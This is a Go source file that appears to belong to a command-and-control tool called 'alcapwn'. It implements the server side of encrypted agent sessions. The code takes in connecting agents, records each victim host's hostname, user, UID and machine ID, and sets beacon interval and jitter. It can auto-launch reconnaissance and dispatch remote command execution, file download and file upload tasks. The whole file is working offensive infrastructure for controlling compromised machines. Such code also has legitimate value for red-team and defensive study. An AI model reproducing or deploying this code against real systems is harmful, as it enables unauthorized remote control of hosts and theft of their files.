package main

import (
	"encoding/json"
	"fmt"
	"io"
	"sync"
	"sync/atomic"
	"time"

	"alcapwn/proto"
)

// agentHandshakeDeadline is the maximum time allowed for an agent to complete
// the handshake (routing tag + crypto + Hello/Welcome). Connections that take
// longer are closed. Tests may override this to a shorter duration.
var agentHandshakeDeadline = 30 * time.Second

// agentTaskReq is an internal request from an operator command (cmdExec,
// cmdDownload, cmdUpload) to the handleAgentSession write loop.
// resultCh receives exactly one proto.Result: the agent's response or an
// error result if the session disconnects or the task times out.
type agentTaskReq struct {
	task     proto.Task
	resultCh chan proto.Result
}

// handleAgentSession manages the full lifecycle of an agent-protocol session:
//
//  1. Read Hello from agent (magic already consumed by acceptLoop prefixConn).
//  2. Send Welcome with assigned session ID.
//  3. Notify operator and populate sess.IsAgent / sess.AgentMeta.
//  4. Start a read goroutine that dispatches Results and answers Pings.
//  5. Run the write loop: forward Tasks from operator commands to the agent.
//
// The session is removed from the registry when the connection closes.
// Called from acceptLoop in its own goroutine, identically to handleSession.
func handleAgentSession(sess *Session, opts sessionOpts) {
	conn := sess.Conn

	// Set a deadline for the entire handshake phase. Cleared after Welcome.
	conn.SetDeadline(time.Now().Add(agentHandshakeDeadline)) //nolint:errcheck

	// ── Phase 1: Consume routing tag ─────────────────────────────────────────
	// acceptLoop re-injected the 4-byte ALCA magic via prefixConn for routing
	// detection.  Read and discard it here so the next bytes are the handshake.
	if opts.verbosity >= 1 {
		opts.printer.Notify("[*] [%d] Agent connected, reading routing tag...", sess.ID)
	}
	var routingTag [4]byte
	if _, err := io.ReadFull(conn, routingTag[:]); err != nil {
		opts.printer.Notify("[!] [%d] Failed to read routing tag: %v", sess.ID, err)
		conn.Close()
		opts.registry.Remove(sess.ID)
		return
	}
	if opts.verbosity >= 1 {
		opts.printer.Notify("[*] [%d] Routing tag: %q", sess.ID, string(routingTag[:]))
	}

	// ── Phase 2: X25519 key exchange → AES-256-GCM session ───────────────────
	if opts.serverKey == nil {
		opts.printer.Notify("[!] [%d] No server key configured — rejecting agent", sess.ID)
		conn.Close()
		opts.registry.Remove(sess.ID)
		return
	}
	if opts.verbosity >= 1 {
		opts.printer.Notify("[*] [%d] Starting crypto handshake...", sess.ID)
	}
	cs, err := proto.NewServerCryptoSession(conn, opts.serverKey)
	if err != nil {
		opts.printer.Notify("[!] [%d] Crypto handshake failed: %v", sess.ID, err)
		conn.Close()
		opts.registry.Remove(sess.ID)
		return
	}
	if opts.verbosity >= 1 {
		opts.printer.Notify("[*] [%d] Crypto handshake OK", sess.ID)
	}

	// ── Phase 3: Encrypted Hello / Welcome ───────────────────────────────────
	if opts.verbosity >= 1 {
		opts.printer.Notify("[*] [%d] Waiting for agent hello...", sess.ID)
	}
	env, err := proto.ReadMsgEncrypted(conn, cs)
	if err != nil {
		opts.printer.Notify("[!] [%d] Agent hello read failed: %v", sess.ID, err)
		conn.Close()
		opts.registry.Remove(sess.ID)
		return
	}
	if env.Type != proto.MsgHello {
		opts.printer.Notify("[!] [%d] Expected agent hello, got: %s", sess.ID, env.Type)
		conn.Close()
		opts.registry.Remove(sess.ID)
		return
	}
	var hello proto.Hello
	if err := json.Unmarshal(env.Data, &hello); err != nil {
		opts.printer.Notify("[!] [%d] Malformed agent hello: %v", sess.ID, err)
		conn.Close()
		opts.registry.Remove(sess.ID)
		return
	}
	if opts.verbosity >= 1 {
		opts.printer.Notify("[*] [%d] Got hello: %s/%s user=%s", sess.ID, hello.OS, hello.Arch, hello.User)
	}

	if opts.verbosity >= 1 {
		opts.printer.Notify("[*] [%d] Sending welcome...", sess.ID)
	}
	if err := proto.WriteMsgEncrypted(conn, cs, proto.MsgWelcome, proto.Welcome{
		SessionID: sess.ID,
		Interval:  60,
		Jitter:    20,
	}); err != nil {
		opts.printer.Notify("[!] [%d] Could not send welcome: %v", sess.ID, err)
		conn.Close()
		opts.registry.Remove(sess.ID)
		return
	}
	if opts.verbosity >= 1 {
		opts.printer.Notify("[*] [%d] Welcome sent, agent ready", sess.ID)
	}

	// Handshake complete — clear the deadline for normal operation.
	conn.SetDeadline(time.Time{}) //nolint:errcheck

	// ── Session setup ────────────────────────────────────────────────────────

	taskCh := make(chan agentTaskReq, 16)
	sess.mu.Lock()
	sess.IsAgent = true
	sess.AgentMeta = &hello
	sess.agentTaskCh = taskCh
	sess.mu.Unlock()

	opts.printer.Notify("[+] Agent %d ready — %s  (%s/%s  uid=%s  mid=%s)",
		sess.ID, hello.Hostname, hello.OS, hello.Arch, hello.UID, hello.MachineID)

	// Auto-recon: if the operator launched with -r/--recon, kick off a
	// background recon immediately after the task channel is live.
	if opts.autoRecon && opts.agentReadyCb != nil {
		go opts.agentReadyCb(sess)
	}

	// ── Bidirectional task dispatch (encrypted) ───────────────────────────────

	var pendingMu sync.Mutex
	pending := make(map[string]chan proto.Result)

	done := make(chan struct{})

	// Read goroutine: decrypts Results and Pings; Pong via WriteMsgEncrypted
	// (safe: CryptoSession.writeMu serialises concurrent writers).
	go func() {
		defer close(done)
		for {
			env, err := proto.ReadMsgEncrypted(conn, cs)
			if err != nil {
				return
			}
			switch env.Type {
			case proto.MsgResult:
				var res proto.Result
				if err := json.Unmarshal(env.Data, &res); err != nil {
					continue
				}
				pendingMu.Lock()
				ch, ok := pending[res.TaskID]
				if ok {
					delete(pending, res.TaskID)
				}
				pendingMu.Unlock()
				if ok {
					ch <- res
				}

			case proto.MsgPing:
				proto.WriteMsgEncrypted(conn, cs, proto.MsgPong, struct{}{}) //nolint:errcheck
			}
		}
	}()

	// Write loop: encrypt and forward Tasks to the agent.
	for {
		select {
		case <-done:
			// Agent disconnected — resolve any pending tasks with an error result.
			pendingMu.Lock()
			for id, ch := range pending {
				ch <- proto.Result{TaskID: id, Error: "agent disconnected"}
				delete(pending, id)
			}
			pendingMu.Unlock()
			opts.printer.Notify("[-] Agent %d disconnected", sess.ID)
			conn.Close()
			opts.registry.Remove(sess.ID)
			return

		case req := <-taskCh:
			pendingMu.Lock()
			pending[req.task.ID] = req.resultCh
			pendingMu.Unlock()
			if err := proto.WriteMsgEncrypted(conn, cs, proto.MsgTask, req.task); err != nil {
				req.resultCh <- proto.Result{TaskID: req.task.ID, Error: err.Error()}
				return
			}
		}
	}
}

// agentExec sends a TaskExec to the agent and blocks until the result arrives
// or timeout elapses.
func agentExec(sess *Session, command string, timeout time.Duration) (proto.Result, error) {
	return agentDispatch(sess, proto.Task{
		ID:      agentTaskID("ex"),
		Kind:    proto.TaskExec,
		Command: command,
	}, timeout)
}

// agentDownload asks the agent to read remotePath and returns the file bytes.
func agentDownload(sess *Session, remotePath string) ([]byte, error) {
	res, err := agentDispatch(sess, proto.Task{
		ID:   agentTaskID("dl"),
		Kind: proto.TaskDownload,
		Path: remotePath,
	}, 60*time.Second)
	if err != nil {
		return nil, err
	}
	if res.Error != "" {
		return nil, fmt.Errorf("%s", res.Error)
	}
	return res.Output, nil
}

// agentUpload asks the agent to write data to remotePath.
func agentUpload(sess *Session, remotePath string, data []byte) error {
	res, err := agentDispatch(sess, proto.Task{
		ID:   agentTaskID("ul"),
		Kind: proto.TaskUpload,
		Path: remotePath,
		Data: data,
	}, 60*time.Second)
	if err != nil {
		return err
	}
	if res.Error != "" {
		return fmt.Errorf("%s", res.Error)
	}
	return nil
}

// agentDispatch is the shared send-and-wait helper for all task types.
func agentDispatch(sess *Session, task proto.Task, timeout time.Duration) (proto.Result, error) {
	sess.mu.Lock()
	ch := sess.agentTaskCh
	sess.mu.Unlock()
	if ch == nil {
		return proto.Result{}, fmt.Errorf("agent task channel not initialised")
	}

	resultCh := make(chan proto.Result, 1)
	req := agentTaskReq{task: task, resultCh: resultCh}

	select {
	case ch <- req:
	case <-time.After(2 * time.Second):
		return proto.Result{}, fmt.Errorf("task queue full or session not ready")
	}

	select {
	case res := <-resultCh:
		return res, nil
	case <-time.After(timeout):
		return proto.Result{}, fmt.Errorf("task timed out after %v", timeout)
	}
}

// taskSeq is an atomic counter for generating unique task IDs.
var taskSeq atomic.Uint64

// agentTaskID returns a short unique task ID built from a prefix and
// a monotonically increasing atomic counter.
func agentTaskID(prefix string) string {
	return fmt.Sprintf("%s%x", prefix, taskSeq.Add(1))
}

